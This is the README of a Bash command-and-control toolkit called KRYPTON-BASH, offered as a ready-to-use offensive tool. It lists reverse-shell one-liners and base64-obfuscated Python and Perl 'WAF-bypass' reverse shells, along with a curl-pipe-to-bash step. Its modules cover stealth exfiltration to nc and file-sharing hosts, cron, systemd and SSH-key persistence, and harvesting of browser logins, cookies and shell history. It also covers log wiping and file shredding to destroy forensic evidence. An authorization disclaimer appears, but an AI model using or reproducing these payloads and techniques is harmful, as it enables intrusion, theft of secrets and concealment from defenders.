# KRYPTON-BASH

A comprehensive Command & Control (C2) Dashboard built entirely in Bash with a professional dark-themed ASCII UI. Designed for security testing, penetration testing, and authorized red team operations.

## 🎯 Overview

KRYPTON-BASH provides a complete toolkit for:
- **C2 Operations**: ngrok tunnel automation and reverse shell listeners
- **Payload Generation**: WAF-bypass obfuscated reverse shells
- **Shell Stabilization**: TTY upgrades, privilege discovery, and process masking
- **Exfiltration**: Targeted file discovery and stealth data transfer
- **Persistence**: Cron hijacking, systemd services, and SSH key injection
- **Network Pivoting**: Internal subnet scanning and credential harvesting
- **Forensic Erasure**: Log clearing and secure file deletion

## 📋 Requirements

- **Operating System**: Linux (tested on Ubuntu, Debian, Kali, CentOS)
- **Bash**: Version 4.0 or higher
- **Required Tools**:
  - `ngrok` (for tunnel automation)
  - `nc` (netcat) or `netcat-openbsd`
  - `curl` (for API calls and exfiltration)
  - `python` or `python3` (for TTY upgrades)
  - `shred` (optional, for secure deletion)

## 🚀 Installation

1. Clone or download the repository:
```bash
cd /path/to/ait_tab
```

2. Make the script executable:
```bash
chmod +x krypton-bash.sh
```

3. Run the dashboard:
```bash
./krypton-bash.sh
```

## 📖 Usage

### Main Menu

The main menu provides access to 12 modules:

```
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   KRYPTON-BASH - Command & Control Dashboard                  ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝

[1] Start ngrok TCP Tunnel (Port 4444)
[2] Start Listener (nc -lvnp 4444)
[3] Start Full C2 (Tunnel + Listener)
[4] Show Tunnel Status
[5] Stop ngrok Tunnel
[6] Generate Reverse Shell Payload
[7] Generate WAF-Bypass Obfuscated Payload
[8] Generate Stabilization & Discovery Script
[9] Exfiltration & Forensic Erasure
[10] Persistence & Backdoor
[11] Network Pivoting & Lateral Discovery
[12] Multi-Channel Exfiltration (High-Volume)
[0] Exit
```

### Module Details

#### [1] Start ngrok TCP Tunnel (Port 4444)

Automatically starts an ngrok TCP tunnel on port 4444 and extracts the public URL using curl.

**Features:**
- Checks for ngrok installation
- Starts ngrok in background
- Extracts public URL and port from ngrok API
- Displays tunnel information (local port, public URL, public port, PID)
- Saves tunnel info to `/tmp/krypton_tunnel_info.txt`

**Usage:**
1. Select option [1]
2. Wait for ngrok to start
3. Copy the public URL for your reverse shell payload

#### [2] Start Listener (nc -lvnp 4444)

Starts a netcat listener on port 4444 to catch incoming reverse shell connections.

**Features:**
- Uses `nc -lvnp 4444` for listening
- Displays connection status
- Press Ctrl+C to stop

**Usage:**
1. Select option [2]
2. Wait for incoming connections
3. Interact with connected shells

#### [3] Start Full C2 (Tunnel + Listener)

Combines options [1] and [2] for a complete C2 setup.

**Features:**
- Automatically starts ngrok tunnel
- Automatically starts listener after tunnel is active
- One-command C2 deployment

**Usage:**
1. Select option [3]
2. Wait for tunnel and listener to start
3. Use the public URL for payloads

#### [4] Show Tunnel Status

Displays the status of the active ngrok tunnel.

**Features:**
- Shows public address from saved tunnel info
- Verifies ngrok process is running
- Displays tunnel PID

**Usage:**
1. Select option [4]
2. Review tunnel status

#### [5] Stop ngrok Tunnel

Stops the active ngrok tunnel and cleans up temporary files.

**Features:**
- Kills ngrok process by PID
- Removes temporary tunnel info files
- Fallback to `pkill` if PID file missing

**Usage:**
1. Select option [5]
2. Tunnel is stopped

#### [6] Generate Reverse Shell Payload

Generates various reverse shell payloads for the active tunnel.

**Features:**
- Auto-detects active tunnel
- Generates Bash, Netcat, Python, and PHP payloads
- Displays target host and port
- Copy-paste ready payloads

**Payload Types:**
- Bash: `bash -i >& /dev/tcp/HOST/PORT 0>&1`
- Netcat: `nc -e /bin/bash HOST PORT`
- Python: Python socket-based reverse shell
- PHP: PHP fsockopen reverse shell

**Usage:**
1. Select option [6]
2. Choose to use active tunnel or enter manual host/port
3. Copy desired payload

#### [7] Generate WAF-Bypass Obfuscated Payload

Generates Base64-encoded payloads wrapped in Python or Perl to bypass Web Application Firewalls.

**Features:**
- Takes ngrok IP and Port as input
- Uses `/dev/tcp/` native Linux protocol
- Prepends `unset HISTFILE` to disable shell history
- Base64 encodes the entire payload
- Wraps in `python -c` with base64.b64decode() and exec()
- Wraps in `perl -e` with MIME::Base64 and eval()
- Saves all variants to `/tmp/krypton_payload_*.txt`
- Optional clipboard copy (Linux with xclip)

**Usage:**
1. Select option [7]
2. Choose to use active tunnel or enter manual host/port
3. Copy Python or Perl wrapper payload
4. Execute on target

**Example Output:**
```
[PYTHON] python -c wrapper (WAF Bypass):
python -c "import base64; exec(base64.b64decode('dW5zZXQgSElTVEZJTEU7IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjEwLzQ0NDQgMD4mMQ=='))"

[PERL] perl -e wrapper (WAF Bypass):
perl -e "use MIME::Base64; eval(decode_base64('dW5zZXQgSElTVEZJTEU7IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjEwLzQ0NDQgMD4mMQ=='))"
```

#### [8] Generate Stabilization & Discovery Script

Generates a standalone script for immediate execution upon shell connection.

**Features:**
- TTY Upgrade using Python/Script methods
- Process masking as `[kworker/u2:1]` kernel worker
- Privilege discovery (current user, groups)
- SUID binary scanning
- Writable file checks (/etc/shadow, /etc/passwd, /etc/sudoers)
- System and network information gathering
- Saves to `/tmp/krypton-stabilize.sh`
- Displays full script content

**Usage:**
1. Select option [8]
2. Script is generated to `/tmp/krypton-stabilize.sh`
3. Transfer script to target
4. Execute: `bash /tmp/krypton-stabilize.sh`

**Alternative (one-liner):**
```bash
curl -s http://YOUR_SERVER/krypton-stabilize.sh | bash
```

#### [9] Exfiltration & Forensic Erasure

Targeted file discovery, stealth exfiltration, and forensic cleanup.

**Features:**
- Targeted Search: Scans `/var/www/` for `.env`, `config.php`, and `*.sql` files
- Stealth Transfer: Compresses and streams files over TCP without local storage
- Scorched Earth: Clears logs and shreds the script itself

**Sub-features:**
- File discovery with counts
- tar compression and nc streaming
- Log clearing: `/var/log/lastlog`, `/var/log/auth.log`, `/var/log/wtmp`, `/var/log/btmp`, `/var/log/secure`, `/var/log/syslog`
- Secure script deletion with `shred -vfuz`

**Usage:**
1. Select option [9]
2. Confirm tunnel or enter custom exfiltration host/port
3. Review discovered files
4. Proceed with stealth transfer
5. Confirm forensic erasure (optional)

#### [10] Persistence & Backdoor

Multiple persistence mechanisms for long-term access.

**Sub-menu Options:**
- [1] Cron-Job Hijack (30-minute reverse shell)
- [2] Systemd Service (fake dbus-monitor.service)
- [3] SSH-Key Injection (authorized_keys)
- [4] All Persistence Methods
- [0] Back to Main Menu

**Features:**

**Cron-Job Hijack:**
- Adds hidden cron entry every 30 minutes
- Uses random hash comment for stealth
- Auto-detects active tunnel
- Confirmation before adding to crontab

**Systemd Service:**
- Generates fake `dbus-monitor.service` file
- Configured as daemon with auto-restart every 30s
- Installs to `/etc/systemd/system/` with enable/start
- Permission check before installation

**SSH-Key Injection:**
- Generates 4096-bit RSA key pair automatically
- Appends public key to `~/.ssh/authorized_keys`
- Saves private key path to `/tmp/krypton_ssh_key_path.txt`
- Checks for duplicate keys before injection
- Supports custom key input

**All Methods:**
- Deploys all three persistence mechanisms at once
- Single-command deployment

**Usage:**
1. Select option [10]
2. Choose persistence method (1-4)
3. Confirm deployment
4. Private key saved to `/tmp/krypton_id_rsa` for SSH access

#### [11] Network Pivoting & Lateral Discovery

Internal network scanning and credential harvesting.

**Sub-menu Options:**
- [1] Internal Ping Sweep (scan /24 subnet)
- [2] Port Discovery (SSH:22, SMB:445, RDP:3389)
- [3] Credential Harvesting
- [4] Full Network Scan (all above)
- [0] Back to Main Menu

**Features:**

**Internal Ping Sweep:**
- Auto-detects local IP and subnet
- Multi-threaded ping sweep (254 parallel pings)
- Displays active hosts excluding local machine
- Saves results to `/tmp/krypton_active_hosts.txt`

**Port Discovery:**
- Scans ports 22 (SSH), 445 (SMB), 3389 (RDP)
- Uses bash `/dev/tcp` for port checking
- Loads previously discovered hosts or manual input
- Displays open ports with service labels

**Credential Harvesting:**
- Extracts `/etc/hosts` content
- Displays last 50 lines of `~/.bash_history`
- Searches for password patterns
- Discovers Firefox profiles: `places.sqlite`, `logins.json`, `key4.db`
- Discovers Chrome/Chromium profiles: `History`, `Login Data`, `Cookies`
- Lists SSH keys in `~/.ssh`
- Saves all findings to `/tmp/krypton_credentials.txt`

**Full Network Scan:**
- Combines ping sweep, port discovery, and credential harvesting
- Saves comprehensive results to `/tmp/krypton_full_scan.txt`

**Usage:**
1. Select option [11]
2. Choose discovery method (1-4)
3. Results saved to `/tmp/krypton_*.txt` files

#### [12] Multi-Channel Exfiltration (High-Volume)

Chunking and HTTP-based exfiltration for large files.

**Features:**
- Chunking: Splits files into 10MB parts using `split -b 10M`
- HTTP Siphoning: Uploads to anonymous file-sharing services
  - Supports `transfer.sh`
  - Supports `file.io`
  - Supports custom URLs via curl POST
- Verification: Deletes chunks immediately after successful upload
- Zero Forensic Evidence: Securely deletes original file with `shred -vfuz`

**4-Step Process:**
1. Chunking file into 10MB parts
2. Uploading chunks via HTTP
3. Verifying upload and cleaning chunks
4. Deleting original file (zero forensic evidence)

**Usage:**
1. Select option [12]
2. Enter target file (.sql, .tar.gz, etc.)
3. Enter upload URL (transfer.sh, file.io, or custom)
4. Chunks upload sequentially with immediate deletion
5. Confirm original file deletion for zero forensic evidence
6. URLs saved to `/tmp/krypton_exfiltration_urls.txt`

## 🔧 Configuration Files

The script uses temporary files in `/tmp/` for state persistence:

- `/tmp/krypton_tunnel_info.txt` - Active tunnel information
- `/tmp/krypton_ngrok_pid.txt` - ngrok process ID
- `/tmp/krypton_payload_python.txt` - Python obfuscated payload
- `/tmp/krypton_payload_perl.txt` - Perl obfuscated payload
- `/tmp/krypton_payload_b64.txt` - Base64 encoded payload
- `/tmp/krypton_stabilize.sh` - Stabilization script
- `/tmp/krypton_active_hosts.txt` - Discovered network hosts
- `/tmp/krypton_credentials.txt` - Harvested credentials
- `/tmp/krypton_full_scan.txt` - Full network scan results
- `/tmp/krypton_ssh_key_path.txt` - SSH key path
- `/tmp/krypton_exfiltration_urls.txt` - Exfiltrated file URLs

## ⚠️ Warnings & Notes

- **Authorization**: This tool is intended for authorized security testing only. Unauthorized use is illegal.
- **ngrok**: Requires a free ngrok account and installation from https://ngrok.com/download
- **Permissions**: Some modules require root/sudo privileges (systemd services, log clearing)
- **Forensic Evidence**: The forensic erasure modules permanently delete data. Use with caution.
- **Network Detection**: Network scanning and port discovery may trigger IDS/IPS systems.
- **File Deletion**: The multi-channel exfiltration module permanently deletes original files. Always confirm before proceeding.

## 📝 Example Workflow

### Basic C2 Setup

```bash
# 1. Start the dashboard
./krypton-bash.sh

# 2. Select option [3] to start full C2 (tunnel + listener)
# Wait for ngrok to start and display public URL

# 3. Select option [7] to generate WAF-bypass payload
# Use the active tunnel option
# Copy the Python or Perl wrapper

# 4. Execute payload on target system
python -c "import base64; exec(base64.b64decode('...'))"

# 5. Once connected, select option [8] to generate stabilization script
# Transfer and execute on target

# 6. Use option [11] for network pivoting and lateral discovery

# 7. Use option [10] for persistence mechanisms

# 8. Use option [9] for exfiltration and forensic erasure
```

### High-Volume Data Exfiltration

```bash
# 1. Start dashboard
./krypton-bash.sh

# 2. Select option [12] for multi-channel exfiltration

# 3. Enter target file (e.g., database.sql or backup.tar.gz)

# 4. Enter upload URL (e.g., https://transfer.sh)

# 5. Watch chunks upload sequentially
# Each chunk is deleted immediately after successful upload

# 6. Confirm original file deletion for zero forensic evidence

# 7. Retrieve URLs from /tmp/krypton_exfiltration_urls.txt
```

## 🛠️ Troubleshooting

**ngrok not found:**
- Install ngrok from https://ngrok.com/download
- Add to PATH or use absolute path

**netcat not working:**
- Install: `sudo apt install netcat-openbsd` (Debian/Ubuntu)
- Install: `sudo yum install nc` (CentOS/RHEL)

**Permission denied on systemd service:**
- Run with sudo: `sudo ./krypton-bash.sh`
- Or use cron-based persistence instead

**TTY upgrade fails:**
- Ensure Python or Python3 is installed
- Try manual TTY upgrade: `script -q /dev/null bash`

**Port scanning shows no results:**
- Check firewall rules
- Verify network connectivity
- Try with sudo for raw socket access

## 📄 License

This tool is provided for educational and authorized security testing purposes only. Use responsibly and in compliance with all applicable laws and regulations.

## 🤝 Contributing

This is a security research tool. Contributions should focus on improving security testing capabilities and defensive awareness.

## ⚡ Performance Tips

- Use option [3] for fastest C2 setup
- Save tunnel info for quick payload generation
- Use option [4] to verify tunnel status before operations
- Clean up temporary files regularly to avoid disk space issues

## 🔒 Security Considerations

- All temporary files are stored in `/tmp/` and should be cleaned up
- Use shred for secure deletion when available
- Disable shell history with `unset HISTFILE` before operations
- Mask processes to blend in with system processes
- Use obfuscated payloads to bypass detection mechanisms

---

**KRYPTON-BASH** - Professional C2 Dashboard for Security Testing
"# let-me-reverse-shell" 
